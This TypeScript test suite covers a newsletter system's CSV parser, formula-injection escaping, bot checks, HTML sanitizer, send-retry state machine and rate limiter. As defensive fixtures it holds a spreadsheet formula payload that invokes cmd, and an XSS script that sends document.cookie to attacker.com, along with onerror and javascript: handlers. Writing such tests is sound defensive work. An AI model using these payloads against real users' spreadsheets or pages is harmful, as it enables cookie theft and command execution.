import test, { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  escapeForCsvExport,
  parseCsvRfc4180,
  validateNewsletterSubscriptionInput,
} from "../src/lib/newsletter-utils";
import {
  escapeHtml,
  sanitizeEmailHtml,
  buildUnsubscribeUrl,
} from "../src/lib/newsletter-email";

// ─────────────────────────────────────────────────────────────────────────────
// 1. RFC 4180 CSV PARSER & EXPORT SECURITY TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("RFC 4180 CSV Parser & Formula Injection Defense", () => {
  it("should parse standard comma-separated rows", () => {
    const csv = "email,first_name,consent\nalice@example.com,Alice,yes\nbob@example.com,Bob,yes";
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 3);
    assert.deepEqual(rows[0], ["email", "first_name", "consent"]);
    assert.deepEqual(rows[1], ["alice@example.com", "Alice", "yes"]);
    assert.deepEqual(rows[2], ["bob@example.com", "Bob", "yes"]);
  });

  it("should parse fields containing commas inside double quotes", () => {
    const csv = 'email,address,consent\n"user@example.com","House 12, MG Road, New Delhi",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], "House 12, MG Road, New Delhi");
  });

  it("should handle escaped double quotes within quoted fields", () => {
    const csv = 'email,notes,consent\n"artisan@kauseyah.com","Master weaver of ""Patan Patola""",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], 'Master weaver of "Patan Patola"');
  });

  it("should correctly handle multiline fields within double quotes", () => {
    const csv = 'email,bio,consent\n"patron@kauseyah.com","Lover of silk.\nCollector of handloom crafts.",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], "Lover of silk.\nCollector of handloom crafts.");
  });

  it("should shield against Spreadsheet Formula Injection (CWE-1236)", () => {
    // Malicious formula prefixes: =, +, -, @, \t, \r
    const formulaPayloads = [
      "=cmd|' /C calc'!A0",
      "+1234567890",
      "-5+5",
      "@SUM(A1:A10)",
      "\tDANGEROUS",
      "\rDANGEROUS",
    ];

    for (const payload of formulaPayloads) {
      const exported = escapeForCsvExport(payload);
      // Must start with quote and prepend single quote before the formula trigger
      assert.ok(
        exported.startsWith("\"'") || exported.startsWith("\"''"),
        `Expected ${exported} to be shielded with single quote for payload: ${payload}`
      );
    }

    // Normal safe strings should be enclosed without leading single quote
    const safeStr = escapeForCsvExport("Kauseyah Silk");
    assert.equal(safeStr, '"Kauseyah Silk"');

    // Null or undefined should output empty quoted string
    assert.equal(escapeForCsvExport(null), '""');
    assert.equal(escapeForCsvExport(undefined), '""');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. PUBLIC SUBSCRIPTION INPUT & BOT DEFENSE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Newsletter Subscription Input & Bot Shield Validation", () => {
  it("should successfully validate genuine subscriber payload", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "  Patron@Kauseyah.com  ",
      firstName: "Himani",
      consent: true,
      loadTime: Date.now() - 2500, // 2.5 seconds human fill time
    });

    assert.equal(result.valid, true);
    assert.equal(result.normalizedEmail, "patron@kauseyah.com");
    assert.equal(result.cleanFirstName, "Himani");
  });

  it("should detect and drop honeypot bot submissions silently", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "spammer@botnet.org",
      consent: true,
      honeypot: "http://malicious-link.com",
      loadTime: Date.now() - 5000,
    });

    assert.equal(result.valid, false);
    assert.equal(result.isBot, true);
  });

  it("should detect and drop sub-second automated submissions", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "fastbot@crawler.io",
      consent: true,
      loadTime: Date.now() - 300, // 300ms impossible human fill time
    });

    assert.equal(result.valid, false);
    assert.equal(result.isBot, true);
  });

  it("should reject submissions without explicit affirmative consent", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "user@example.com",
      consent: false,
      loadTime: Date.now() - 3000,
    });

    assert.equal(result.valid, false);
    assert.match(result.error || "", /agree to receive updates/i);
  });

  it("should reject invalid email formats", () => {
    const invalidEmails = [
      "plainaddress",
      "@missingusername.com",
      "user@.com",
      "user@domain..com",
      "user with spaces@domain.com",
    ];

    for (const badEmail of invalidEmails) {
      const res = validateNewsletterSubscriptionInput({
        email: badEmail,
        consent: true,
        loadTime: Date.now() - 2000,
      });
      assert.equal(res.valid, false);
      assert.match(res.error || "", /valid email/i);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. HTML SANITIZATION & INJECTION DEFENSE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Email HTML Sanitization and Escaping", () => {
  it("should escape special characters to prevent HTML injection in text fields", () => {
    const untrusted = `<script>alert("pwned")</script> & 'Craft'`;
    const escaped = escapeHtml(untrusted);
    assert.equal(
      escaped,
      "&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt; &amp; &#39;Craft&#39;"
    );
  });

  it("should strip executable script and event handler tags from campaign HTML", () => {
    const maliciousHtml = `
      <h1>The Kauseyah Journal</h1>
      <p>Our winter silk collection is live.</p>
      <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
      <img src="https://kauseyah.com/silk.jpg" onerror="alert('xss')" />
      <a href="javascript:alert(1)">Click here</a>
      <iframe src="https://malicious.com"></iframe>
    `;

    const sanitized = sanitizeEmailHtml(maliciousHtml);

    assert.ok(!sanitized.includes("<script>"), "Must strip <script> tags");
    assert.ok(!sanitized.includes("onerror"), "Must strip inline event handlers");
    assert.ok(!sanitized.includes("javascript:"), "Must strip javascript: pseudo-protocols");
    assert.ok(!sanitized.includes("<iframe"), "Must strip <iframe> tags");
    assert.ok(sanitized.includes("<h1>The Kauseyah Journal</h1>"), "Must preserve safe header tags");
    assert.ok(sanitized.includes("<img"), "Must preserve safe image tags");
    assert.ok(sanitized.includes("https://kauseyah.com/silk.jpg"), "Must preserve valid image src");
  });

  it("should build valid RFC 8058 compliant unsubscribe URLs", () => {
    const token = "a1b2c3d4e5f678901234567890abcdef";
    const url = buildUnsubscribeUrl(token);
    assert.ok(url.includes("/api/newsletter/unsubscribe?token=" + token));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. CAMPAIGN CLAIMING, RETRY & RECONCILIATION STATE MACHINE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Campaign Claiming & Retry Lifecycle State Machine", () => {
  interface MockRecipientLog {
    id: string;
    email: string;
    status: "pending" | "processing" | "sent" | "failed";
    attempt_count: number;
    updated_at: number;
  }

  function simulateClaimRecipients(
    logs: MockRecipientLog[],
    batchSize: number,
    timeoutMs: number,
    currentTime: number
  ): MockRecipientLog[] {
    const candidates = logs.filter((log) => {
      if (log.status === "pending") return true;
      if (log.status === "failed" && log.attempt_count < 3) return true;
      if (log.status === "processing" && currentTime - log.updated_at > timeoutMs) return true;
      return false;
    });

    // Sort by attempt_count ASC
    candidates.sort((a, b) => a.attempt_count - b.attempt_count);
    const claimed = candidates.slice(0, batchSize);

    for (const c of claimed) {
      c.status = "processing";
      c.attempt_count += 1;
      c.updated_at = currentTime;
    }

    return claimed;
  }

  function simulateReconciliation(logs: MockRecipientLog[]): {
    status: "sending" | "sent" | "partially_failed";
    isComplete: boolean;
    sent: number;
    failed: number;
    pending: number;
    processing: number;
  } {
    const sent = logs.filter((l) => l.status === "sent").length;
    const failed = logs.filter((l) => l.status === "failed").length;
    const pending = logs.filter((l) => l.status === "pending").length;
    const processing = logs.filter((l) => l.status === "processing").length;

    const isComplete = pending === 0 && processing === 0;
    let status: "sending" | "sent" | "partially_failed" = "sending";

    if (isComplete) {
      status = failed > 0 ? "partially_failed" : "sent";
    }

    return { status, isComplete, sent, failed, pending, processing };
  }

  it("should claim pending recipients and increment attempt_count", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "pending", attempt_count: 0, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "pending", attempt_count: 0, updated_at: 1000 },
    ];

    const claimed = simulateClaimRecipients(logs, 10, 300000, 2000);
    assert.equal(claimed.length, 2);
    assert.equal(logs[0].status, "processing");
    assert.equal(logs[0].attempt_count, 1);
    assert.equal(logs[1].status, "processing");
    assert.equal(logs[1].attempt_count, 1);
  });

  it("should allow retrying failed recipients when attempt_count < 3", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "failed", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "failed", attempt_count: 3, updated_at: 1000 }, // Exhausted
    ];

    const claimed = simulateClaimRecipients(logs, 10, 300000, 2000);
    assert.equal(claimed.length, 1);
    assert.equal(claimed[0].id, "1");
    assert.equal(logs[0].attempt_count, 2);
    assert.equal(logs[0].status, "processing");

    // Recipient 2 with attempt_count = 3 must NOT be claimed
    assert.equal(logs[1].status, "failed");
    assert.equal(logs[1].attempt_count, 3);
  });

  it("should reclaim abandoned processing jobs after timeout threshold", () => {
    const now = 500000;
    const timeoutMs = 300000; // 5 minutes
    const logs: MockRecipientLog[] = [
      { id: "1", email: "stalled@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 100000 }, // 400s old > 300s timeout
      { id: "2", email: "active@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 450000 },  // 50s old < 300s timeout
    ];

    const claimed = simulateClaimRecipients(logs, 10, timeoutMs, now);
    assert.equal(claimed.length, 1);
    assert.equal(claimed[0].id, "1");
    assert.equal(logs[0].attempt_count, 2);

    // Active worker job must remain undisturbed
    assert.equal(logs[1].status, "processing");
    assert.equal(logs[1].attempt_count, 1);
  });

  it("must NEVER mark campaign completed while active workers (status: processing) exist", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "sent@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "working@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, false);
    assert.equal(recon.status, "sending");
  });

  it("should mark campaign sent when all recipients are sent and no failures exist", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, true);
    assert.equal(recon.status, "sent");
    assert.equal(recon.sent, 2);
    assert.equal(recon.failed, 0);
  });

  it("should mark campaign partially_failed when retries are exhausted and failures remain", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "failed", attempt_count: 3, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, true);
    assert.equal(recon.status, "partially_failed");
    assert.equal(recon.sent, 1);
    assert.equal(recon.failed, 1);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. SERVERLESS RATE LIMITING STATE MACHINE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Serverless Rate Limiter State Machine", () => {
  interface RateLimitEntry {
    ipHash: string;
    attempts: number;
    lastAttemptAt: number;
    blockedUntil: number | null;
  }

  function evaluateRateLimit(
    entry: RateLimitEntry | undefined,
    currentTime: number,
    maxAttempts = 5,
    windowMs = 15 * 60 * 1000
  ): { allowed: boolean; updatedEntry: RateLimitEntry } {
    if (!entry) {
      return {
        allowed: true,
        updatedEntry: {
          ipHash: "test_ip",
          attempts: 1,
          lastAttemptAt: currentTime,
          blockedUntil: null,
        },
      };
    }

    // Check if blocked
    if (entry.blockedUntil && entry.blockedUntil > currentTime) {
      return { allowed: false, updatedEntry: entry };
    }

    // Check window expiration
    if (currentTime - entry.lastAttemptAt > windowMs) {
      return {
        allowed: true,
        updatedEntry: {
          ...entry,
          attempts: 1,
          lastAttemptAt: currentTime,
          blockedUntil: null,
        },
      };
    }

    // Within window: check threshold
    if (entry.attempts >= maxAttempts) {
      return {
        allowed: false,
        updatedEntry: {
          ...entry,
          attempts: entry.attempts + 1,
          lastAttemptAt: currentTime,
          blockedUntil: currentTime + windowMs,
        },
      };
    }

    return {
      allowed: true,
      updatedEntry: {
        ...entry,
        attempts: entry.attempts + 1,
        lastAttemptAt: currentTime,
      },
    };
  }

  it("should allow the first attempt and increment counter", () => {
    const res = evaluateRateLimit(undefined, 1000, 5, 60000);
    assert.equal(res.allowed, true);
    assert.equal(res.updatedEntry.attempts, 1);
  });

  it("should block when attempts exceed maximum within the window", () => {
    let entry: RateLimitEntry | undefined = undefined;
    const now = 10000;

    // Perform 5 allowed attempts
    for (let i = 1; i <= 5; i++) {
      const res = evaluateRateLimit(entry, now, 5, 60000);
      assert.equal(res.allowed, true);
      entry = res.updatedEntry;
    }

    // 6th attempt must be rejected and set blockedUntil
    const blockedRes = evaluateRateLimit(entry, now, 5, 60000);
    assert.equal(blockedRes.allowed, false);
    assert.ok(blockedRes.updatedEntry.blockedUntil! > now);
  });

  it("should reset the attempt counter after the window expires", () => {
    const entry: RateLimitEntry = {
      ipHash: "test_ip",
      attempts: 4,
      lastAttemptAt: 10000,
      blockedUntil: null,
    };

    // 70 seconds later (window is 60s)
    const futureTime = 10000 + 70000;
    const res = evaluateRateLimit(entry, futureTime, 5, 60000);

    assert.equal(res.allowed, true);
    assert.equal(res.updatedEntry.attempts, 1);
  });

  it("should simulate atomic initial-row upsert under concurrency without lost increments", () => {
    // Simulates the PostgreSQL pattern:
    // 1. INSERT ... ON CONFLICT DO NOTHING (initializes row at attempts: 0 if missing)
    // 2. SELECT ... FOR UPDATE (serializes concurrent transactions)
    const dbRows = new Map<string, RateLimitEntry>();

    function atomicUpsertAndRecord(ipHash: string, now: number, maxAttempts = 5): { allowed: boolean; attempts: number } {
      // Step 1: Ensure row exists
      if (!dbRows.has(ipHash)) {
        dbRows.set(ipHash, { ipHash, attempts: 0, lastAttemptAt: now, blockedUntil: null });
      }

      // Step 2: Row-level lock simulation (serialized per hash)
      const row = dbRows.get(ipHash)!;

      if (row.blockedUntil && row.blockedUntil > now) {
        return { allowed: false, attempts: row.attempts };
      }

      if (row.attempts === 0 || now - row.lastAttemptAt > 60000) {
        row.attempts = 1;
        row.lastAttemptAt = now;
        row.blockedUntil = null;
        return { allowed: true, attempts: 1 };
      }

      row.attempts += 1;
      row.lastAttemptAt = now;
      if (row.attempts > maxAttempts) {
        row.blockedUntil = now + 60000;
        return { allowed: false, attempts: row.attempts };
      }
      return { allowed: true, attempts: row.attempts };
    }

    // Two simultaneous requests for unseen hash
    const req1 = atomicUpsertAndRecord("unseen_ip", 1000);
    const req2 = atomicUpsertAndRecord("unseen_ip", 1000);

    assert.equal(req1.allowed, true);
    assert.equal(req1.attempts, 1);
    assert.equal(req2.allowed, true);
    assert.equal(req2.attempts, 2);
    assert.equal(dbRows.get("unseen_ip")?.attempts, 2);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 6. CONSENT AUDIT ROLLBACK & WORKER CONCURRENCY SIMULATION
// ─────────────────────────────────────────────────────────────────────────────

describe("Consent Audit Compensation & Concurrent Worker Isolation", () => {
  it("should rollback subscriber insertion if consent record fails (compensation logic)", () => {
    interface SubscriberState {
      email: string;
      status: string;
      consentAuditLogged: boolean;
    }

    const subscribers = new Map<string, SubscriberState>();

    function simulateSubscribeWithAudit(
      email: string,
      simulateAuditFailure: boolean
    ): { success: boolean; error?: string } {
      // 1. Insert subscriber
      subscribers.set(email, { email, status: "active", consentAuditLogged: false });

      // 2. Insert consent record
      if (simulateAuditFailure) {
        // Rollback on audit failure
        subscribers.delete(email);
        return { success: false, error: "Failed to securely record subscription consent audit." };
      }

      const sub = subscribers.get(email)!;
      sub.consentAuditLogged = true;
      return { success: true };
    }

    const failedAttempt = simulateSubscribeWithAudit("audit-fail@kauseyah.com", true);
    assert.equal(failedAttempt.success, false);
    assert.equal(subscribers.has("audit-fail@kauseyah.com"), false, "Subscriber must be deleted if audit fails");

    const successAttempt = simulateSubscribeWithAudit("audit-pass@kauseyah.com", false);
    assert.equal(successAttempt.success, true);
    assert.equal(subscribers.get("audit-pass@kauseyah.com")?.consentAuditLogged, true);
  });

  it("should guarantee two concurrent workers never claim the same recipient (SKIP LOCKED simulation)", () => {
    interface RecipientRecord {
      id: string;
      email: string;
      status: "pending" | "processing" | "sent";
    }

    const pool: RecipientRecord[] = Array.from({ length: 15 }, (_, i) => ({
      id: `id-${i}`,
      email: `user${i}@kauseyah.com`,
      status: "pending",
    }));

    // Simulates Worker 1 claiming 10 rows
    const worker1Claimed: RecipientRecord[] = [];
    for (const r of pool) {
      if (worker1Claimed.length >= 10) break;
      if (r.status === "pending") {
        r.status = "processing";
        worker1Claimed.push(r);
      }
    }

    // Simulates Worker 2 claiming remaining rows (skips locked / processing rows)
    const worker2Claimed: RecipientRecord[] = [];
    for (const r of pool) {
      if (worker2Claimed.length >= 10) break;
      if (r.status === "pending") {
        r.status = "processing";
        worker2Claimed.push(r);
      }
    }

    assert.equal(worker1Claimed.length, 10);
    assert.equal(worker2Claimed.length, 5);

    // Verify zero overlap
    const worker1Ids = new Set(worker1Claimed.map((w) => w.id));
    for (const w2 of worker2Claimed) {
      assert.equal(worker1Ids.has(w2.id), false, `Worker 2 claimed item ${w2.id} already claimed by Worker 1`);
    }
  });
});
